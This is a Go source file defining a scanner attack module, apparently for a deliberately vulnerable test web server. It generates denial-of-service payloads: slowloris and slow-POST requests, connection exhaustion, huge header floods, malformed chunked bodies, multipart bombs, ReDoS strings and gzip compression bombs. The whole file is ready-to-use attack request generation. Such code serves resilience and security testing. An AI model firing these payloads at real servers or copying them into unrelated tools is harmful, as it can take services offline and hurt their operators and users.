package attacks

import (
	"bytes"
	"compress/gzip"
	"fmt"
	"strings"

	"github.com/glitchWebServer/internal/scanner"
)

// SlowHTTPModule generates attack requests designed to exhaust server
// resources through slow HTTP techniques: partial headers, slow POST bodies,
// slow reads, connection exhaustion, large headers, chunked abuse,
// multipart bombs, ReDoS payloads, and compression bombs.
type SlowHTTPModule struct{}

func (m *SlowHTTPModule) Name() string     { return "slowhttp" }
func (m *SlowHTTPModule) Category() string { return "denial-of-service" }

func (m *SlowHTTPModule) GenerateRequests(target string) []scanner.AttackRequest {
	var reqs []scanner.AttackRequest

	reqs = append(reqs, m.slowloris()...)
	reqs = append(reqs, m.slowPost()...)
	reqs = append(reqs, m.slowRead()...)
	reqs = append(reqs, m.connectionExhaustion()...)
	reqs = append(reqs, m.largeHeaders()...)
	reqs = append(reqs, m.chunkedAbuse()...)
	reqs = append(reqs, m.multipartBomb()...)
	reqs = append(reqs, m.redosPayloads()...)
	reqs = append(reqs, m.compressionBomb()...)

	return reqs
}

// ---------------------------------------------------------------------------
// Slowloris — partial HTTP headers sent slowly
// ---------------------------------------------------------------------------

func (m *SlowHTTPModule) slowloris() []scanner.AttackRequest {
	var reqs []scanner.AttackRequest

	paths := []string{"/", "/login", "/api/v1/users", "/admin"}

	for _, path := range paths {
		// Build incrementing X-Slowloris headers to keep the connection open
		// while the server waits for the final \r\n\r\n.
		headers := make(map[string]string)
		for i := 0; i < 20; i++ {
			headers[fmt.Sprintf("X-Slowloris-%d", i)] = fmt.Sprintf("keep-alive-%d", i)
		}
		headers["X-Glitch-Slow"] = "true"
		headers["Connection"] = "keep-alive"

		reqs = append(reqs, scanner.AttackRequest{
			Method:      "GET",
			Path:        path,
			Headers:     headers,
			Category:    "Slow-HTTP",
			SubCategory: "slowloris",
			Description: fmt.Sprintf("Slowloris: partial headers with 20 X-Slowloris-N headers on %s", path),
		})
	}

	// Variant with very long header values to delay parsing
	longHeaders := make(map[string]string)
	for i := 0; i < 10; i++ {
		longHeaders[fmt.Sprintf("X-Slowloris-%d", i)] = strings.Repeat("slow", 250)
	}
	longHeaders["X-Glitch-Slow"] = "true"
	longHeaders["Connection"] = "keep-alive"

	reqs = append(reqs, scanner.AttackRequest{
		Method:      "GET",
		Path:        "/",
		Headers:     longHeaders,
		Category:    "Slow-HTTP",
		SubCategory: "slowloris",
		Description: "Slowloris: 10 headers with 1KB values each",
	})

	return reqs
}

// ---------------------------------------------------------------------------
// Slow POST (R-U-Dead-Yet) — large Content-Length, tiny actual body
// ---------------------------------------------------------------------------

func (m *SlowHTTPModule) slowPost() []scanner.AttackRequest {
	var reqs []scanner.AttackRequest

	paths := []string{"/", "/login", "/api/v1/users", "/upload", "/search"}
	contentTypes := []struct {
		ct   string
		body string
		desc string
	}{
		{"application/x-www-form-urlencoded", "username=slow", "form data"},
		{"application/json", `{"slow":true}`, "JSON body"},
		{"text/plain", "drip", "plain text"},
		{"application/xml", "<slow>true</slow>", "XML body"},
	}

	for _, path := range paths {
		for _, ct := range contentTypes {
			reqs = append(reqs, scanner.AttackRequest{
				Method:   "POST",
				Path:     path,
				Body:     ct.body,
				BodyType: ct.ct,
				Headers: map[string]string{
					"Content-Length": "1048576", // 1MB declared
					"X-Glitch-Slow": "true",
					"Connection":    "keep-alive",
				},
				Category:    "Slow-HTTP",
				SubCategory: "slow-post",
				Description: fmt.Sprintf("Slow POST (RUDY): 1MB Content-Length, tiny %s body on %s", ct.desc, path),
			})
		}
	}

	// Extreme variant: 10MB declared Content-Length
	reqs = append(reqs, scanner.AttackRequest{
		Method:   "POST",
		Path:     "/",
		Body:     "x",
		BodyType: "application/octet-stream",
		Headers: map[string]string{
			"Content-Length": "10485760", // 10MB declared
			"X-Glitch-Slow": "true",
			"Connection":    "keep-alive",
		},
		Category:    "Slow-HTTP",
		SubCategory: "slow-post",
		Description: "Slow POST (RUDY): 10MB Content-Length, 1-byte body",
	})

	return reqs
}

// ---------------------------------------------------------------------------
// Slow READ — normal request, slow response consumption
// ---------------------------------------------------------------------------

func (m *SlowHTTPModule) slowRead() []scanner.AttackRequest {
	var reqs []scanner.AttackRequest

	paths := []string{"/", "/api/v1/users", "/search?q=test", "/vuln/a03/search?q=data"}

	for _, path := range paths {
		reqs = append(reqs, scanner.AttackRequest{
			Method: "GET",
			Path:   path,
			Headers: map[string]string{
				"X-Glitch-Slow":   "true",
				"Connection":      "keep-alive",
				"Accept-Encoding": "identity", // no compression so response is large
			},
			Category:    "Slow-HTTP",
			SubCategory: "slow-read",
			Description: fmt.Sprintf("Slow READ: request with identity encoding to maximize response size on %s", path),
		})
	}

	// Request large content with small window advertisement
	reqs = append(reqs, scanner.AttackRequest{
		Method: "GET",
		Path:   "/",
		Headers: map[string]string{
			"X-Glitch-Slow":   "true",
			"Connection":      "keep-alive",
			"Accept-Encoding": "identity",
			"Range":           "bytes=0-",
		},
		Category:    "Slow-HTTP",
		SubCategory: "slow-read",
		Description: "Slow READ: Range request for full content with slow consumption",
	})

	return reqs
}

// ---------------------------------------------------------------------------
// Connection Exhaustion — many keep-alive connections
// ---------------------------------------------------------------------------

func (m *SlowHTTPModule) connectionExhaustion() []scanner.AttackRequest {
	var reqs []scanner.AttackRequest

	paths := []string{"/", "/login", "/api/v1/users", "/search", "/admin"}

	for _, path := range paths {
		// Standard keep-alive exhaustion
		reqs = append(reqs, scanner.AttackRequest{
			Method: "GET",
			Path:   path,
			Headers: map[string]string{
				"Connection": "keep-alive",
				"Keep-Alive": "timeout=300, max=1000",
			},
			Category:    "Slow-HTTP",
			SubCategory: "connection-exhaustion",
			Description: fmt.Sprintf("Connection exhaustion: keep-alive timeout=300 max=1000 on %s", path),
		})

		// Pipelining-style: multiple requests implied
		reqs = append(reqs, scanner.AttackRequest{
			Method: "GET",
			Path:   path,
			Headers: map[string]string{
				"Connection": "keep-alive",
				"Keep-Alive": "timeout=600, max=10000",
				"X-Pipeline":  "true",
			},
			Category:    "Slow-HTTP",
			SubCategory: "connection-exhaustion",
			Description: fmt.Sprintf("Connection exhaustion: aggressive keep-alive timeout=600 max=10000 on %s", path),
		})
	}

	// Multiple connection-holding variants
	for i := 0; i < 10; i++ {
		reqs = append(reqs, scanner.AttackRequest{
			Method: "GET",
			Path:   fmt.Sprintf("/?conn_exhaust=%d", i),
			Headers: map[string]string{
				"Connection": "keep-alive",
				"Keep-Alive": "timeout=900, max=99999",
				"X-Conn-ID":  fmt.Sprintf("exhaust-%d", i),
			},
			Category:    "Slow-HTTP",
			SubCategory: "connection-exhaustion",
			Description: fmt.Sprintf("Connection exhaustion: parallel connection #%d with extreme keep-alive", i),
		})
	}

	return reqs
}

// ---------------------------------------------------------------------------
// Large Header Attack — 32KB-64KB of headers
// ---------------------------------------------------------------------------

func (m *SlowHTTPModule) largeHeaders() []scanner.AttackRequest {
	var reqs []scanner.AttackRequest

	// 32KB of headers: 32 headers * 1KB each
	headers32k := make(map[string]string)
	for i := 0; i < 32; i++ {
		headers32k[fmt.Sprintf("X-Padding-%05d", i)] = strings.Repeat("A", 1024)
	}
	reqs = append(reqs, scanner.AttackRequest{
		Method:      "GET",
		Path:        "/",
		Headers:     headers32k,
		Category:    "Slow-HTTP",
		SubCategory: "large-headers",
		Description: "Large header attack: 32KB total (32 headers x 1KB)",
	})

	// 48KB of headers: 48 headers * 1KB each
	headers48k := make(map[string]string)
	for i := 0; i < 48; i++ {
		headers48k[fmt.Sprintf("X-Padding-%05d", i)] = strings.Repeat("A", 1024)
	}
	reqs = append(reqs, scanner.AttackRequest{
		Method:      "GET",
		Path:        "/",
		Headers:     headers48k,
		Category:    "Slow-HTTP",
		SubCategory: "large-headers",
		Description: "Large header attack: 48KB total (48 headers x 1KB)",
	})

	// 64KB of headers: 64 headers * 1KB each
	headers64k := make(map[string]string)
	for i := 0; i < 64; i++ {
		headers64k[fmt.Sprintf("X-Padding-%05d", i)] = strings.Repeat("A", 1024)
	}
	reqs = append(reqs, scanner.AttackRequest{
		Method:      "GET",
		Path:        "/",
		Headers:     headers64k,
		Category:    "Slow-HTTP",
		SubCategory: "large-headers",
		Description: "Large header attack: 64KB total (64 headers x 1KB)",
	})

	// Single massive header
	reqs = append(reqs, scanner.AttackRequest{
		Method: "GET",
		Path:   "/",
		Headers: map[string]string{
			"X-Mega-Header": strings.Repeat("B", 65536),
		},
		Category:    "Slow-HTTP",
		SubCategory: "large-headers",
		Description: "Large header attack: single 64KB header value",
	})

	// Many small headers adding up to 32KB+
	manyHeaders := make(map[string]string)
	for i := 0; i < 500; i++ {
		manyHeaders[fmt.Sprintf("X-H-%05d", i)] = strings.Repeat("V", 64)
	}
	reqs = append(reqs, scanner.AttackRequest{
		Method:      "GET",
		Path:        "/",
		Headers:     manyHeaders,
		Category:    "Slow-HTTP",
		SubCategory: "large-headers",
		Description: "Large header attack: 500 headers x 64 bytes (~32KB)",
	})

	// Cookie header with massive value
	reqs = append(reqs, scanner.AttackRequest{
		Method: "GET",
		Path:   "/",
		Headers: map[string]string{
			"Cookie": strings.Repeat("session="+strings.Repeat("X", 500)+"; ", 64),
		},
		Category:    "Slow-HTTP",
		SubCategory: "large-headers",
		Description: "Large header attack: massive Cookie header (~32KB)",
	})

	return reqs
}

// ---------------------------------------------------------------------------
// Chunked Request Abuse — invalid sizes, infinite chunks, slow delivery
// ---------------------------------------------------------------------------

func (m *SlowHTTPModule) chunkedAbuse() []scanner.AttackRequest {
	var reqs []scanner.AttackRequest

	// Invalid chunk size (negative)
	reqs = append(reqs, scanner.AttackRequest{
		Method:   "POST",
		Path:     "/",
		Body:     "-1\r\ndata\r\n0\r\n\r\n",
		BodyType: "text/plain",
		Headers: map[string]string{
			"Transfer-Encoding": "chunked",
		},
		Category:    "Slow-HTTP",
		SubCategory: "chunked-abuse",
		Description: "Chunked abuse: negative chunk size",
	})

	// Invalid chunk size (hex overflow)
	reqs = append(reqs, scanner.AttackRequest{
		Method:   "POST",
		Path:     "/",
		Body:     "FFFFFFFFFFFFFFFF\r\ndata\r\n0\r\n\r\n",
		BodyType: "text/plain",
		Headers: map[string]string{
			"Transfer-Encoding": "chunked",
		},
		Category:    "Slow-HTTP",
		SubCategory: "chunked-abuse",
		Description: "Chunked abuse: chunk size overflow (16 F's)",
	})

	// Mismatched chunk size (says 1000 but sends 4 bytes)
	reqs = append(reqs, scanner.AttackRequest{
		Method:   "POST",
		Path:     "/",
		Body:     "3e8\r\ndata\r\n0\r\n\r\n",
		BodyType: "text/plain",
		Headers: map[string]string{
			"Transfer-Encoding": "chunked",
		},
		Category:    "Slow-HTTP",
		SubCategory: "chunked-abuse",
		Description: "Chunked abuse: chunk size 1000 but only 4 bytes sent",
	})

	// Many tiny chunks (simulate slow delivery)
	var tinyChunks strings.Builder
	for i := 0; i < 100; i++ {
		tinyChunks.WriteString("1\r\nX\r\n")
	}
	tinyChunks.WriteString("0\r\n\r\n")
	reqs = append(reqs, scanner.AttackRequest{
		Method:   "POST",
		Path:     "/",
		Body:     tinyChunks.String(),
		BodyType: "text/plain",
		Headers: map[string]string{
			"Transfer-Encoding": "chunked",
			"X-Glitch-Slow":    "true",
		},
		Category:    "Slow-HTTP",
		SubCategory: "chunked-abuse",
		Description: "Chunked abuse: 100 single-byte chunks (slow delivery)",
	})

	// No terminal chunk
	reqs = append(reqs, scanner.AttackRequest{
		Method:   "POST",
		Path:     "/",
		Body:     "4\r\ndata\r\n4\r\nmore\r\n",
		BodyType: "text/plain",
		Headers: map[string]string{
			"Transfer-Encoding": "chunked",
		},
		Category:    "Slow-HTTP",
		SubCategory: "chunked-abuse",
		Description: "Chunked abuse: missing terminal 0-length chunk",
	})

	// Chunk extensions abuse
	reqs = append(reqs, scanner.AttackRequest{
		Method:   "POST",
		Path:     "/",
		Body:     "4;" + strings.Repeat("ext=val;", 100) + "\r\ndata\r\n0\r\n\r\n",
		BodyType: "text/plain",
		Headers: map[string]string{
			"Transfer-Encoding": "chunked",
		},
		Category:    "Slow-HTTP",
		SubCategory: "chunked-abuse",
		Description: "Chunked abuse: excessive chunk extensions",
	})

	// Invalid chunk encoding (non-hex characters in size)
	reqs = append(reqs, scanner.AttackRequest{
		Method:   "POST",
		Path:     "/",
		Body:     "ZZZZ\r\ndata\r\n0\r\n\r\n",
		BodyType: "text/plain",
		Headers: map[string]string{
			"Transfer-Encoding": "chunked",
		},
		Category:    "Slow-HTTP",
		SubCategory: "chunked-abuse",
		Description: "Chunked abuse: non-hex chunk size",
	})

	// Chunk with trailing headers (trailers)
	reqs = append(reqs, scanner.AttackRequest{
		Method:   "POST",
		Path:     "/",
		Body:     "4\r\ndata\r\n0\r\nX-Trailer: evil\r\nX-Trailer-2: " + strings.Repeat("A", 4096) + "\r\n\r\n",
		BodyType: "text/plain",
		Headers: map[string]string{
			"Transfer-Encoding": "chunked",
			"Trailer":           "X-Trailer, X-Trailer-2",
		},
		Category:    "Slow-HTTP",
		SubCategory: "chunked-abuse",
		Description: "Chunked abuse: oversized trailing headers (4KB trailer)",
	})

	return reqs
}

// ---------------------------------------------------------------------------
// Multipart Form Bomb — thousands of parts, huge boundaries
// ---------------------------------------------------------------------------

func (m *SlowHTTPModule) multipartBomb() []scanner.AttackRequest {
	var reqs []scanner.AttackRequest

	// Boundary with maximum length
	longBoundary := strings.Repeat("X", 70) // RFC 2046 max boundary is 70 chars

	// Multipart with 1000 empty parts
	var manyParts strings.Builder
	for i := 0; i < 1000; i++ {
		manyParts.WriteString(fmt.Sprintf("--%s\r\n", longBoundary))
		manyParts.WriteString(fmt.Sprintf("Content-Disposition: form-data; name=\"field%d\"\r\n\r\n", i))
		manyParts.WriteString("x\r\n")
	}
	manyParts.WriteString(fmt.Sprintf("--%s--\r\n", longBoundary))

	reqs = append(reqs, scanner.AttackRequest{
		Method:   "POST",
		Path:     "/upload",
		Body:     manyParts.String(),
		BodyType: fmt.Sprintf("multipart/form-data; boundary=%s", longBoundary),
		Category:    "Slow-HTTP",
		SubCategory: "multipart-bomb",
		Description: "Multipart bomb: 1000 parts with 70-char boundary",
	})

	// Multipart with deeply nested boundaries
	innerBoundary := strings.Repeat("Y", 70)
	var nestedBody strings.Builder
	nestedBody.WriteString(fmt.Sprintf("--%s\r\n", longBoundary))
	nestedBody.WriteString(fmt.Sprintf("Content-Type: multipart/mixed; boundary=%s\r\n\r\n", innerBoundary))
	for i := 0; i < 100; i++ {
		nestedBody.WriteString(fmt.Sprintf("--%s\r\n", innerBoundary))
		nestedBody.WriteString(fmt.Sprintf("Content-Disposition: form-data; name=\"nested%d\"\r\n\r\n", i))
		nestedBody.WriteString(strings.Repeat("Z", 100))
		nestedBody.WriteString("\r\n")
	}
	nestedBody.WriteString(fmt.Sprintf("--%s--\r\n", innerBoundary))
	nestedBody.WriteString(fmt.Sprintf("--%s--\r\n", longBoundary))

	reqs = append(reqs, scanner.AttackRequest{
		Method:   "POST",
		Path:     "/upload",
		Body:     nestedBody.String(),
		BodyType: fmt.Sprintf("multipart/form-data; boundary=%s", longBoundary),
		Category:    "Slow-HTTP",
		SubCategory: "multipart-bomb",
		Description: "Multipart bomb: nested multipart with 100 inner parts",
	})

	// Multipart with file upload fields and large filenames
	var filenameBomb strings.Builder
	for i := 0; i < 50; i++ {
		filenameBomb.WriteString(fmt.Sprintf("--%s\r\n", longBoundary))
		longFilename := strings.Repeat("A", 1024)
		filenameBomb.WriteString(fmt.Sprintf("Content-Disposition: form-data; name=\"file%d\"; filename=\"%s.txt\"\r\n", i, longFilename))
		filenameBomb.WriteString("Content-Type: application/octet-stream\r\n\r\n")
		filenameBomb.WriteString("data\r\n")
	}
	filenameBomb.WriteString(fmt.Sprintf("--%s--\r\n", longBoundary))

	reqs = append(reqs, scanner.AttackRequest{
		Method:   "POST",
		Path:     "/upload",
		Body:     filenameBomb.String(),
		BodyType: fmt.Sprintf("multipart/form-data; boundary=%s", longBoundary),
		Category:    "Slow-HTTP",
		SubCategory: "multipart-bomb",
		Description: "Multipart bomb: 50 file parts with 1KB filenames each",
	})

	return reqs
}

// ---------------------------------------------------------------------------
// ReDoS Payloads — catastrophic backtracking patterns
// ---------------------------------------------------------------------------

func (m *SlowHTTPModule) redosPayloads() []scanner.AttackRequest {
	var reqs []scanner.AttackRequest

	// Classic ReDoS patterns: (a+)+$ with many a's then a non-matching char
	redosStrings := []struct {
		payload string
		desc    string
	}{
		{strings.Repeat("a", 30) + "!", "(a+)+$ pattern — 30 a's + non-match"},
		{strings.Repeat("a", 25) + "b", "(a+)+b$ pattern — 25 a's + wrong char"},
		{"0" + strings.Repeat("1", 30) + "!", "(0|0?1+)+ pattern — 30 1's + non-match"},
		{strings.Repeat("ab", 20) + "c", "((ab)+)+$ pattern — 20 ab's + non-match"},
		{strings.Repeat("a", 30) + "\x00", "(a+)+$ with null terminator"},
		{strings.Repeat("aaa", 15) + "X", "(a{3})+$ pattern — 45 a's + non-match"},
		{"<" + strings.Repeat(" ", 30) + "!", "HTML tag regex backtrack"},
		{strings.Repeat("a@", 15) + "!", "Email regex backtrack pattern"},
		{"http://" + strings.Repeat("a", 30) + "!", "URL regex backtrack pattern"},
		{strings.Repeat("\\", 30) + "!", "Escape sequence backtrack pattern"},
	}

	// As URL parameters
	paths := []string{"/search", "/api/v1/users", "/login"}
	for _, path := range paths {
		for _, r := range redosStrings {
			reqs = append(reqs, scanner.AttackRequest{
				Method:      "GET",
				Path:        fmt.Sprintf("%s?q=%s", path, r.payload),
				Category:    "Slow-HTTP",
				SubCategory: "redos",
				Description: fmt.Sprintf("ReDoS via URL param on %s: %s", path, r.desc),
			})
		}
	}

	// As form fields
	for _, r := range redosStrings {
		reqs = append(reqs, scanner.AttackRequest{
			Method:   "POST",
			Path:     "/search",
			Body:     fmt.Sprintf("query=%s&pattern=%s", r.payload, r.payload),
			BodyType: "application/x-www-form-urlencoded",
			Category:    "Slow-HTTP",
			SubCategory: "redos",
			Description: fmt.Sprintf("ReDoS via POST form field: %s", r.desc),
		})
	}

	// As headers
	for _, r := range redosStrings {
		reqs = append(reqs, scanner.AttackRequest{
			Method: "GET",
			Path:   "/",
			Headers: map[string]string{
				"User-Agent": r.payload,
				"Referer":    r.payload,
			},
			Category:    "Slow-HTTP",
			SubCategory: "redos",
			Description: fmt.Sprintf("ReDoS via headers (UA + Referer): %s", r.desc),
		})
	}

	return reqs
}

// ---------------------------------------------------------------------------
// Compression Bomb — gzip-encoded body of zeros
// ---------------------------------------------------------------------------

func (m *SlowHTTPModule) compressionBomb() []scanner.AttackRequest {
	var reqs []scanner.AttackRequest

	// Generate a gzip-compressed stream of 10MB of zeros.
	// This compresses down to a very small payload.
	var buf bytes.Buffer
	gw, err := gzip.NewWriterLevel(&buf, gzip.BestCompression)
	if err != nil {
		// Fallback: use default compression
		gw = gzip.NewWriter(&buf)
	}

	// Write 10MB of zeros in chunks to avoid huge memory allocation
	zeroChunk := make([]byte, 65536) // 64KB of zeros
	for i := 0; i < 160; i++ {      // 160 * 64KB = ~10MB
		gw.Write(zeroChunk)
	}
	gw.Close()

	compressedBody := buf.String()

	paths := []string{"/", "/api/v1/users", "/upload", "/search"}
	for _, path := range paths {
		reqs = append(reqs, scanner.AttackRequest{
			Method:   "POST",
			Path:     path,
			Body:     compressedBody,
			BodyType: "application/octet-stream",
			Headers: map[string]string{
				"Content-Encoding": "gzip",
			},
			Category:    "Slow-HTTP",
			SubCategory: "compression-bomb",
			Description: fmt.Sprintf("Compression bomb: 10MB of zeros gzip-compressed on %s", path),
		})
	}

	// Variant with application/json content type
	reqs = append(reqs, scanner.AttackRequest{
		Method:   "POST",
		Path:     "/api/v1/users",
		Body:     compressedBody,
		BodyType: "application/json",
		Headers: map[string]string{
			"Content-Encoding": "gzip",
		},
		Category:    "Slow-HTTP",
		SubCategory: "compression-bomb",
		Description: "Compression bomb: gzip zeros claiming to be JSON",
	})

	// Double-compressed variant
	var buf2 bytes.Buffer
	gw2, _ := gzip.NewWriterLevel(&buf2, gzip.BestCompression)
	gw2.Write(buf.Bytes())
	gw2.Close()

	reqs = append(reqs, scanner.AttackRequest{
		Method:   "POST",
		Path:     "/",
		Body:     buf2.String(),
		BodyType: "application/octet-stream",
		Headers: map[string]string{
			"Content-Encoding": "gzip, gzip",
		},
		Category:    "Slow-HTTP",
		SubCategory: "compression-bomb",
		Description: "Compression bomb: double-gzipped 10MB of zeros",
	})

	return reqs
}
